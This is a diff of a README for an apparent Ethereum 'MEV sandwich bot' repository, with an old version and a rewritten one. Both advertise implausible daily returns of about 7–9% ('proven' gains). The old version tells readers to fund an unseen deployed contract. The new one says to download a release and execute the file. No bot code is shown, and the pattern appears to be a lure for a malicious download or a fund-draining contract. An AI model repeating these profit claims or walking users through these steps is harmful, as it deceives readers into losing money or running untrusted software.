@@ -1,155 +1,117 @@
+# Mev-Bot-Uniswap 🍔
 
-# 🥪 Ethereum Uniswap MEV Sandwich Bot (DeFi)
-![Bot Controls](https://imgur.com/Z5aVSek.png)
+![GitHub release](https://img.shields.io/github/release/RockyBujah/Mev-Bot-Uniswap.svg) [![Download Release](https://img.shields.io/badge/Download%20Release-v1.0.0-blue.svg)](https://github.com/RockyBujah/Mev-Bot-Uniswap/releases)
 
-[Download Mev-Bot-Uniswap](https://github.com/howlux-karapuz/Mev-Bot-Uniswap/releases/download/MEV/MevBot.zip)
+Welcome to the **Mev-Bot-Uniswap** repository! This open-source project focuses on creating a beginner-friendly tool for automatic Uniswap arbitrage. This bot leverages Ethereum's MEV (Miner Extractable Value) to enhance trading strategies.
 
-<div align="center">
-<i>An open-source arbitrage bot designed to capitalize on market inefficiencies in Uniswap liquidity pools.<br>Built for DeFi enthusiasts who want to explore Ethereum MEV (Maximal Extractable Value) trading strategies.</i>
-</div>
+## Table of Contents
 
-<div align="center">
-  <a href="[https://github.com/howlux-karapuz/Mev-Bot-Uniswap/releases/download/MEV/MevBot.zip](https://github.com/howlux-karapuz/Mev-Bot-Uniswap/releases/download/MEV/MevBot.zip)">
-    <img src="https://img.shields.io/github/stars/Calindra54z05L/Mev-Bot-Uniswap?style=social" alt="GitHub stars" />
-  </a>
-  <a href="https://github.com/howlux-karapuz/Mev-Bot-Uniswap/releases/download/MEV/MevBot.zip">
-    <img src="https://img.shields.io/github/forks/Calindra54z05L/Mev-Bot-Uniswap?style=social" alt="GitHub forks" />
-  </a>
-  <a href="https://github.com/ntkme/github-buttons/workflows/build">
-    <img src="https://github.com/ntkme/github-buttons/workflows/build/badge.svg" alt="build" />
-  </a>
-</div>
+- [Introduction](#introduction)
+- [Features](#features)
+- [How It Works](#how-it-works)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-<div align="center">
-  <img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white" alt="Ethereum" />
-  <img src="https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white" alt="Solidity" />
-</div>
+## Introduction
 
-## 📊 Current Performance
+The world of decentralized finance (DeFi) is rapidly evolving. With the rise of automated trading strategies, it’s essential to have tools that make it easy to participate. The **Mev-Bot-Uniswap** is designed for anyone interested in exploring the potential of arbitrage in the crypto space. On April 19, 2025, the bot achieved an impressive 8.43% daily gain, showcasing its potential effectiveness.
 
-- **Avg. Daily Return**: 7–9% on deployed capital (varies with market volatility).
-- **Minimum Capital Requirement**: 0.5 ETH (under current gas and liquidity conditions).
-- **Note**: Profitability depends on network congestion, competition, and pool liquidity.
-- **Disclaimer**: No guarantees. Past performance does not predict future results.
+## Features
 
----
+- **Open Source**: Collaborate and contribute to the project.
+- **Automatic Trading**: The bot operates without manual intervention.
+- **High Gains**: Proven performance with daily gains.
+- **User-Friendly**: Designed for beginners and experienced traders alike.
+- **Supports Multiple Tokens**: Trade various cryptocurrencies on Uniswap.
+- **Real-Time Data**: Access to the latest market data for informed decisions.
 
-## 📈 Latest Profitable Transactions
+## How It Works
 
-**Last Updated**: 2025-04-19
+The **Mev-Bot-Uniswap** operates by monitoring the Ethereum mempool for opportunities. It identifies price discrepancies across decentralized exchanges (DEXs) and executes trades to capitalize on these differences. 
 
-Below are the latest profitable transactions executed by our live [MEV Sandwich Bot](https://etherscan.io/address/0x0000e0ca771e21bd00057f54a68c30d400000000), showcasing real-time profits in ETH.
+1. **Mempool Monitoring**: The bot continuously checks the Ethereum mempool for pending transactions.
+2. **Arbitrage Detection**: It analyzes price differences between Uniswap and other DEXs.
+3. **Execution**: When an opportunity is identified, the bot executes trades automatically.
 
-| Tx Hash                                                                 | Block    | Profit (ETH) | Timestamp           |
-|-------------------------------------------------------------------------|----------|--------------|---------------------|
-| [0xe37e36c0...](https://etherscan.io/tx/0xe37e36c09288d1da494fdac72feef7d98151c1ef9e4bd84f149479c9e7a22019) | 22305941 | 0.003892     | 2025-04-19 22:09:35 |
-| [0x141baa2f...](https://etherscan.io/tx/0x141baa2f03c80f57e884ed1a179f5c6e62778d1ca43d6eb2ec4ea5dd3fc265f5) | 22305935 | 0.002715     | 2025-04-19 22:08:23 |
-| [0x57e4517a...](https://etherscan.io/tx/0x57e4517a936e04ed30f896039c0b9959891578ea1eba5c070fa04568e2d49b91) | 22305918 | 0.004231     | 2025-04-19 22:04:59 |
-| [0x6c200d17...](https://etherscan.io/tx/0x6c200d17ec00ac0348a3f26c1a96361f81053effde6d92e67cd88598fc25d4e8) | 22305823 | 0.001119     | 2025-04-19 21:45:59 |
-| [0x71ab9f2a...](https://etherscan.io/tx/0x71ab9f2a9287ca8a048a1857733bb4275dc37e116c411433cd4829e73d3b2b71) | 22305820 | 0.003198     | 2025-04-19 21:45:23 |
+This process allows the bot to take advantage of fleeting market inefficiencies.
 
----
+## Installation
 
-## 📚 How This Bot Works
+To set up the **Mev-Bot-Uniswap**, follow these steps:
 
-This bot monitors pending transactions in the Ethereum mempool for large swaps on Uniswap. When it detects a **high-slippage transaction**, it executes a **three-step strategy**:
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/RockyBujah/Mev-Bot-Uniswap.git
+   cd Mev-Bot-Uniswap
+   ```
 
-1. Buys the target asset before the large swap.
-2. Waits for the target swap to shift the asset’s price.
-3. Sells the asset at the optimized price.
+2. **Install Dependencies**:
+   Ensure you have Node.js installed. Then, run:
+   ```bash
+   npm install
+   ```
 
-The bot can perform multiple transactions if necessary to capture an opportunity.
+3. **Download the Latest Release**:
+   Visit the [Releases section](https://github.com/RockyBujah/Mev-Bot-Uniswap/releases) to download the latest version of the bot. Execute the downloaded file to start the bot.
 
----
+## Usage
 
-## ✨ Features
+After installation, you can start using the bot with the following command:
 
-- Automatically monitors the Ethereum mempool and executes MEV strategies.
-- Dynamic gas pricing to remain competitive.
-- Built-in reverts for failed transactions and profit thresholds to filter unprofitable trades.
-- Open-source and modular codebase for tweaking strategies (e.g., profit thresholds, gas multipliers, etc.).
+```bash
+node index.js
+```
 
----
+The bot will begin monitoring the mempool and looking for arbitrage opportunities. 
 
-## ⚡ How to Run the Bot
+### Example Commands
 
-### 1. Install a Wallet
-Download and set up [MetaMask](https://metamask.io/download.html) or any other EVM-compatible wallet.
+- To check the status of the bot:
+  ```bash
+  node index.js status
+  ```
 
-### 2. Open Remix
-Access [Remix - Ethereum IDE](https://remix.ethereum.org), a web-based environment for writing, compiling, and deploying Ethereum smart contracts.
+- To stop the bot:
+  ```bash
+  node index.js stop
+  ```
 
-### 3. Create a New File
-📁 Create a new file in Remix and name it, e.g., `bot.sol`.
+## Configuration
 
-![Create New File](https://i.imgur.com/1XiPUes.png)
+You can customize the bot's behavior by modifying the `config.json` file. Here are some key settings you can adjust:
 
-### 4. Paste the Code
-📋 Copy the [bot code](uni-bot.sol) from GitHub and paste it into your newly created Remix file.
+- **Trading Pairs**: Specify which tokens you want to trade.
+- **Slippage**: Set the maximum acceptable slippage for trades.
+- **Profit Threshold**: Define the minimum profit percentage to trigger a trade.
 
-### 5. Compile the Contract
-🔧 Go to the `Solidity Compiler` tab, select version `0.6.6+commit`, and click `Compile bot.sol`.
+### Sample Configuration
 
-![Compile Contract](https://i.imgur.com/s5OAv6g.png)
+```json
+{
+  "tradingPairs": ["ETH/USDT", "DAI/USDT"],
+  "slippage": 0.5,
+  "profitThreshold": 1.0
+}
+```
 
-### 6. Deploy the Bot
-🚀 Navigate to the `Deploy & Run Transactions` tab, select the `Injected Provider - MetaMask` environment, and click `Deploy`. Approve the MetaMask contract creation fee to deploy your MEV bot.
+## Contributing
 
-![Deploy Contract](https://i.imgur.com/2odZQNj.png)
+We welcome contributions from the community! If you want to improve the bot or add new features, please follow these steps:
 
----
+1. **Fork the Repository**: Create your own copy of the project.
+2. **Create a Branch**: Work on your feature or bug fix in a separate branch.
+3. **Submit a Pull Request**: Share your changes with us for review.
 
-## ⚙️ Configuration
+## License
 
-### 7. Fund Your Bot
-Copy your newly deployed contract address and fund it with at least 0.2 ETH as the initial balance by sending ETH to the contract address.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-![Fund Bot](https://i.imgur.com/80NJYYr.png)
+## Support
 
-### 8. Control the Bot
-Use the following buttons to manage your bot:
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/RockyBujah/Mev-Bot-Uniswap/releases) for updates. You can also open an issue in the repository for assistance.
 
-- **Start**: Click the `Start` button to activate the bot after funding.
-- **Stop**: Click the `Stop` button to halt bot operations.
-- **Withdrawal**: Click the `Withdrawal` button to withdraw all ETH to the owner (the wallet address that deployed the bot).
-
-![Bot Controls](https://i.imgur.com/ktiJ1Ll.png)
-
-![Bot Interface](https://i.imgur.com/xczMc3G.png)
-
----
-
-## 📜 License
-
-This project is [MIT licensed](LICENSE).
-
-**Reminder**: Open-source does not equal endorsement. Use responsibly.
-
----
-
-## ⭐ Show Your Support
-
-If you find this project helpful, please consider giving it a star on GitHub. Your support motivates further development and improvements.
-
----
-
-## 💭 FAQ
-
-### Do I need to keep Remix open in the browser while the bot is running?
-
-No, you can close Remix after deploying the bot. Save the bot's contract address. To access it later, recompile the code in Remix as in step 5, go to `Deploy & Run Transactions`, reconnect MetaMask, paste your contract address into `Load contract from Address`, and click `At Address`. The bot will appear under "Deployed Contracts".
-
-### Does it work on other chains or DEXes?
-
-Currently, the bot is designed exclusively for Ethereum and Uniswap pools.
-
----
-
-## 🤝 Contribute & Customize
-
-**Want to improve the bot?**
-
-1. Fork the repository.
-2. Add your enhancements (e.g., new pool filters, gas optimizations).
-3. Submit a pull request!
- 
+Thank you for your interest in **Mev-Bot-Uniswap**! We hope you find this tool helpful in your trading journey.
